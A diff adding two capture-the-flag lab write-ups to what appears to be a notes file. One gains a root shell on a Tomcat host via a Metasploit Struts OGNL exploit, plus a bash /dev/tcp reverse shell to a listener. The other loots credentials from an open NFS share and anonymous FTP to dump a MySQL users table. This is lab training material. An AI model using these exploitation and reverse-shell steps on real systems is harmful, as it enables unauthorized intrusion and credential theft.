@@ -215,3 +215,408 @@ while next_req != "end":
 
 print("Your flag is {}".format(flag))
 ```
+
+# Task 15 - Day 10
+Compromise a web app using Metasploit
+
+* Enumeration - nmap
+    ```
+    nmap -A -T4 10.10.78.17 | tee nmap.txt
+
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 18:51 EST
+    Nmap scan report for 10.10.78.17
+    Host is up (0.22s latency).
+    Not shown: 997 closed ports
+    PORT    STATE SERVICE VERSION
+    22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 e8:dd:1c:ce:df:26:23:a9:76:b7:50:bd:96:56:cf:61 (RSA)
+    |   256 1b:0f:f8:e4:d6:e4:ac:63:ee:57:32:58:72:9e:d8:ea (ECDSA)
+    |_  256 55:65:5b:1e:f5:6c:91:53:22:d4:63:9a:58:a6:96:32 (ED25519)
+    80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
+    |_http-server-header: Apache-Coyote/1.1
+    | http-title: Santa Naughty and Nice Tracker
+    |_Requested resource was showcase.action
+    111/tcp open  rpcbind 2-4 (RPC #100000)
+    | rpcinfo: 
+    |   program version    port/proto  service
+    |   100000  2,3,4        111/tcp   rpcbind
+    |   100000  2,3,4        111/udp   rpcbind
+    |   100000  3,4          111/tcp6  rpcbind
+    |   100000  3,4          111/udp6  rpcbind
+    |   100024  1          53641/tcp   status
+    |   100024  1          53698/udp6  status
+    |   100024  1          56403/udp   status
+    |_  100024  1          60529/tcp6  status
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
+    ```
+* Enumeration - metasploit - dir_scanner
+    ```
+    msf6 > search dir_scanner
+
+    Matching Modules
+    ================
+
+    #  Name                                Disclosure Date  Rank    Check  Description
+    -  ----                                ---------------  ----    -----  -----------
+    0  auxiliary/scanner/http/dir_scanner                   normal  No     HTTP Directory Scanner
+
+
+    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/dir_scanner
+
+    msf6 > use 0
+    
+    
+    msf6 auxiliary(scanner/http/dir_scanner) > set rhosts 10.10.78.17
+    rhosts => 10.10.78.17
+
+    
+    msf6 auxiliary(scanner/http/dir_scanner) > set dictionary /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+    dictionary => /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+    
+    
+    msf6 auxiliary(scanner/http/dir_scanner) > run
+
+    [*] Detecting error code
+    [*] Using code '404' as not found for 10.10.78.17
+    [+] Found http://10.10.78.17:80/# Copyright 2007 James Fisher/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# Attribution-Share Alike 3.0 License. To view a copy of this/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# Suite 300, San Francisco, California, 94105, USA./ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# on atleast 2 different hosts/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# or send a letter to Creative Commons, 171 Second Street,/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# This work is licensed under the Creative Commons/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# Priority ordered case sensative list, where entries were found/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# license, visit http://creativecommons.org/licenses/by-sa/3.0// 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/# directory-list-2.3-medium.txt/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80// 302 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/static/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/chat/ 302 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/ajax/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/interactive/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/person/ 302 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/conversion/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/wait/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/xslt/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/token/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/validation/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/video games/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/struts/ 200 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/spyware doctor/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/nero 7/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/long distance/ 400 (10.10.78.17)
+    [+] Found http://10.10.78.17:80/cell phones/ 404 (10.10.78.17)
+    ```
+* Noticed /struts in dir_scanner output, search for struts in metasploit and try one
+    ```
+    msf6 auxiliary(scanner/http/dir_scanner) > search struts
+
+    Matching Modules
+    ================
+
+    #   Name                                                     Disclosure Date  Rank       Check  Description
+    -   ----                                                     ---------------  ----       -----  -----------
+    0   exploit/multi/http/struts2_code_exec_showcase            2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
+    1   exploit/multi/http/struts2_content_type_ognl             2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
+    2   exploit/multi/http/struts2_multi_eval_ognl               2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
+    3   exploit/multi/http/struts2_namespace_ognl                2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+    4   exploit/multi/http/struts2_rest_xstream                  2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
+    5   exploit/multi/http/struts_code_exec                      2010-07-13       good       No     Apache Struts Remote Command Execution
+    6   exploit/multi/http/struts_code_exec_classloader          2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+    7   exploit/multi/http/struts_code_exec_exception_delegator  2012-01-06       excellent  No     Apache Struts Remote Command Execution
+    8   exploit/multi/http/struts_code_exec_parameters           2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
+    9   exploit/multi/http/struts_default_action_mapper          2013-07-02       excellent  Yes    Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
+    10  exploit/multi/http/struts_dev_mode                       2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+    11  exploit/multi/http/struts_dmi_exec                       2016-04-27       excellent  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
+    12  exploit/multi/http/struts_dmi_rest_exec                  2016-06-01       excellent  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
+    13  exploit/multi/http/struts_include_params                 2013-05-24       great      Yes    Apache Struts includeParams Remote Code Execution
+
+
+    msf6 auxiliary(scanner/http/dir_scanner) > use 1
+    [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+
+
+    msf6 exploit(multi/http/struts2_content_type_ognl) > set rhosts 10.10.78.17
+    rhosts => 10.10.78.17
+
+    msf6 exploit(multi/http/struts2_content_type_ognl) > set targeturi /struts
+    targeturi => /struts
+
+
+    msf6 exploit(multi/http/struts2_content_type_ognl) > set lhost tun0
+    lhost => tun0
+
+
+    msf6 exploit(multi/http/struts2_content_type_ognl) > run
+
+    [*] Started reverse TCP handler on a.b.c.d:4444 
+    [*] Sending stage (3008420 bytes) to 10.10.78.17
+    [*] Meterpreter session 1 opened (a.b.c.d:4444 -> 10.10.78.17:50424) at 2021-02-16 19:12:53 -0500
+
+    meterpreter > 
+
+
+    meterpreter > sysinfo
+    Computer     : 172.17.0.2
+    OS           : Debian 8.8 (Linux 4.14.146-93.123.amzn1.x86_64)
+    Architecture : x64
+    BuildTuple   : x86_64-linux-musl
+    Meterpreter  : x64/linux
+
+
+    meterpreter > getuid
+    Server username: root @ 08b6c07cba6d (uid=0, gid=0, euid=0, egid=0)
+    ```
+* Setup listener
+    ```
+    nc -nvlp 6565
+    listening on [any] 6565 ...
+    ```
+* Grab shell
+    ```
+    meterpreter > shell
+    Process 69 created.
+    Channel 1 created.
+
+    bash -i >& /dev/tcp/a.b.c.d/6565 0>&1 
+    ```
+* Check listener
+    ```
+    connect to [a.b.c.d] from (UNKNOWN) [10.10.78.17] 43632
+    bash: cannot set terminal process group (1): Inappropriate ioctl for device
+    bash: no job control in this shell
+    root@08b6c07cba6d:/usr/local/tomcat# 
+    ```
+* Search for first flag
+    ```
+    root@08b6c07cba6d:~# find / -iname *flag* -type f 2>/dev/null
+    ```
+* Find Santa's creds
+    * Located in plaintext in /home/santa
+* Login as Santa with the creds above
+* Find text on certain lines in a file
+    ```
+    [santa@ip-10-10-78-17 ~]$ sed -n '148,148p' naughty_list.txt 
+    [santa@ip-10-10-78-17 ~]$ sed -n '52,52p' nice_list.txt
+    ```
+
+# Task 16 - Day 11
+Attack server services
+
+* Enumeration - nmap
+    ```
+    nmap -A -T4 10.10.172.153 | tee nmap.txt                                          
+
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 20:09 EST                                                                       
+    Nmap scan report for 10.10.172.153                                                                                                    
+    Host is up (0.22s latency).                                                                                                           
+    Not shown: 991 closed ports                                                                                                           
+    PORT     STATE    SERVICE       VERSION                                                                                               
+    21/tcp   open     ftp           vsftpd 3.0.2                                                                                          
+    | ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                
+    |_Can't get directory listing: PASV failed: 500 OOPS: invalid pasv_address                                                            
+    | ftp-syst:                                                                                                                           
+    |   STAT:                                                                                                                             
+    | FTP server status:                                                                                                                  
+    |      Connected to a.b.c.d                                                                                                       
+    |      Logged in as ftp                                                                                                               
+    |      TYPE: ASCII                                                                                                                    
+    |      No session bandwidth limit                                                                                                     
+    |      Session timeout in seconds is 300                                                                                              
+    |      Control connection is plain text                                                                                               
+    |      Data connections will be plain text                                                                                            
+    |      At session startup, client count was 2                                                                                         
+    |      vsFTPd 3.0.2 - secure, fast, stable                                                                                            
+    |_End of status                                                                                                                       
+    111/tcp  open     rpcbind       2-4 (RPC #100000)                                                                                     
+    | rpcinfo: 
+    |   program version    port/proto  service
+    |   100000  2,3,4        111/tcp   rpcbind
+    |   100000  2,3,4        111/udp   rpcbind
+    |   100000  3,4          111/tcp6  rpcbind
+    |   100000  3,4          111/udp6  rpcbind
+    |   100003  3           2049/udp   nfs
+    |   100003  3           2049/udp6  nfs
+    |   100003  3,4         2049/tcp   nfs
+    100003  3           2049/udp6  nfs                                                                                                
+    |   100003  3,4         2049/tcp   nfs                                                                                                
+    |   100003  3,4         2049/tcp6  nfs                                                                                                
+    |   100005  1,2,3      20048/tcp   mountd                                                                                             
+    |   100005  1,2,3      20048/tcp6  mountd                                                                                             
+    |   100005  1,2,3      20048/udp   mountd                                                                                             
+    |   100005  1,2,3      20048/udp6  mountd
+    |   100021  1,3,4      37891/tcp   nlockmgr
+    |   100021  1,3,4      45925/tcp6  nlockmgr
+    |   100021  1,3,4      52521/udp6  nlockmgr
+    |   100021  1,3,4      60056/udp   nlockmgr
+    |   100024  1          33663/tcp   status
+    |   100024  1          35383/tcp6  status
+    |   100024  1          45656/udp6  status
+    |   100024  1          54095/udp   status
+    |   100227  3           2049/tcp   nfs_acl
+    |   100227  3           2049/tcp6  nfs_acl
+    |   100227  3           2049/udp   nfs_acl
+    |_  100227  3           2049/udp6  nfs_acl
+    722/tcp  filtered unknown
+    1984/tcp filtered bigbrother
+    2049/tcp open     nfs_acl       3 (RPC #100227)
+    2608/tcp filtered wag-service
+    3077/tcp filtered orbix-loc-ssl
+    3306/tcp open     mysql         MySQL 5.7.28
+    | mysql-info: 
+    |   Protocol: 10
+    |   Version: 5.7.28
+    |   Thread ID: 4
+    |   Capabilities flags: 65535
+    |   Some Capabilities: Support41Auth, LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, ODBCClient, SupportsTransactions, IgnoreSigpipes, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+    |   Status: Autocommit
+    |   Salt: i=2!  \x03l81bKg\x02
+    | \x0DeI\x10\x17
+    |_  Auth Plugin Name: mysql_native_password
+    | ssl-cert: Subject: commonName=MySQL_Server_5.7.28_Auto_Generated_Server_Certificate
+    | Not valid before: 2019-12-10T23:10:36
+    |_Not valid after:  2029-12-07T23:10:36
+    |_ssl-date: TLS randomness does not represent time
+    3737/tcp filtered xpanel
+    Service Info: OS: Unix
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
+    ```
+* Enumeration - nmap - nfs
+    ```
+    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.172.153
+
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 20:21 EST
+    Nmap scan report for 10.10.172.153
+    Host is up (0.22s latency).
+
+    PORT    STATE SERVICE
+    111/tcp open  rpcbind
+    | nfs-showmount: 
+    |_  /opt/files *
+
+    Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
+    ```
+* Gaining Access - access the nfs share
+    ```
+    sudo mkdir /mnt/tmpnfs
+
+    sudo mount 10.10.172.153:/opt/files /mnt/tmpnfs
+
+    ls -lrta /mnt/tmpnfs
+    total 8
+    -rwxrwxrwx 1 abc  abc    34 Dec 10  2019 creds.txt
+    drwxrwxrwx 2 abc  abc    23 Dec 10  2019 .
+    drwxr-xr-x 4 root root 4096 Feb 16 20:23 ..
+    ```
+* Enumeration - check anon ftp
+    ```
+    ftp 10.10.172.153
+    Connected to 10.10.172.153.
+    220 (vsFTPd 3.0.2)
+    Name (10.10.172.153:abc): anonymous
+    331 Please specify the password.
+    Password:
+    230 Login successful.
+    Remote system type is UNIX.
+    Using binary mode to transfer files.
+    ftp> ls -lrta
+    200 PORT command successful. Consider using PASV.
+    150 Here comes the directory listing.
+    -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
+    drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
+    d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
+    drwxr-xr-x    4 0        0              67 Dec 10  2019 .
+    drwxr-xr-x    4 0        0              67 Dec 10  2019 ..
+    -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+    226 Directory send OK.
+    ftp> get file.txt
+    local: file.txt remote: file.txt
+    200 PORT command successful. Consider using PASV.
+    150 Opening BINARY mode data connection for file.txt (39 bytes).
+    226 Transfer complete.
+    39 bytes received in 0.00 secs (47.7866 kB/s)
+    ftp> get welcome.msg
+    local: welcome.msg remote: welcome.msg
+    200 PORT command successful. Consider using PASV.
+    150 Opening BINARY mode data connection for welcome.msg (224 bytes).
+    226 Transfer complete.
+    224 bytes received in 0.00 secs (4.8551 MB/s)
+    ftp> cd pub
+    250 Directory successfully changed.
+    ftp> ls -lrta
+    200 PORT command successful. Consider using PASV.
+    150 Here comes the directory listing.
+    drwxr-xr-x    2 0        0               6 Nov 04  2019 .
+    drwxr-xr-x    4 0        0              67 Dec 10  2019 ..
+    226 Directory send OK.
+    ftp> 
+    ftp> cd ..
+    250 Directory successfully changed.
+    ftp> cd uploads
+    250 Directory successfully changed.
+    ftp> ls -lrta
+    200 PORT command successful. Consider using PASV.
+    150 Here comes the directory listing.
+    226 Transfer done (but failed to open directory).
+    ```
+* Check anon ftp loot and found db creds
+* Gaining Access - Connect to mysql remotely using db creds
+    ```
+    mysql -h 10.10.172.153 -u root -p
+
+    Enter password: 
+    Welcome to the MariaDB monitor.  Commands end with ; or \g.
+    Your MySQL connection id is 11
+    Server version: 5.7.28 MySQL Community Server (GPL)
+
+    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+    MySQL [(none)]> 
+    ```
+* Manual enumeration around mysql
+    ```
+    MySQL [(none)]> show databases;
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | data               |
+    | mysql              |
+    | performance_schema |
+    | sys                |
+    +--------------------+
+    5 rows in set (0.222 sec)
+
+    MySQL [(none)]> use data;
+    Reading table information for completion of table and column names
+    You can turn off this feature to get a quicker startup with -A
+
+    Database changed
+    MySQL [data]> show tables;
+    +----------------+
+    | Tables_in_data |
+    +----------------+
+    | USERS          |
+    +----------------+
+    1 row in set (0.223 sec)
+
+    MySQL [data]> select * from USERS;
+    +-------+--------------+
+    | name  | password     |
+    +-------+--------------+
+    | admin | [removed]    |
+    +-------+--------------+
+    1 row in set (0.224 sec)
+
+    MySQL [data]> quit
+    Bye
+    ```
